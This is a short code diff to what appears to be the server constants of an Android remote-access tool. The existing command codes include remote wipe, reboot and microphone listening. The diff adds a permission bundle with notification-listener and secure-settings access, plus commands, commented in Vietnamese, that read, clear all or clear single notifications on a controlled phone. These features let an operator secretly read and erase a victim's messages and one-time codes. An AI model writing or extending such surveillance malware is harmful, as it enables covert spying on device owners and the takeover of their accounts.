@@ -158,6 +158,16 @@ exports.checkboxMap = {
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
     'android.permission.RECEIVE_BOOT_COMPLETED'
   ],
+  Permissions8: [
+    'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
+    'android.permission.RECEIVE_BOOT_COMPLETED'
+  ],
 };
 
 //---------------------Lab Controller Vars----------------------------------
@@ -180,4 +190,7 @@ exports.orders = {
   wipeDevice: 'x0000wipeDevice',
   rebootDevice: 'x0000rebootDevice',
   listenMicrophone: 'x0000listenMic',
+  notifications: 'x0000nt', // Thêm notifications
+  clearNotifications: 'x0000clearNt', // Xóa tất cả notifications
+  clearSingleNotification: 'x0000clearSingleNt', // Xóa notification cụ thể
 }
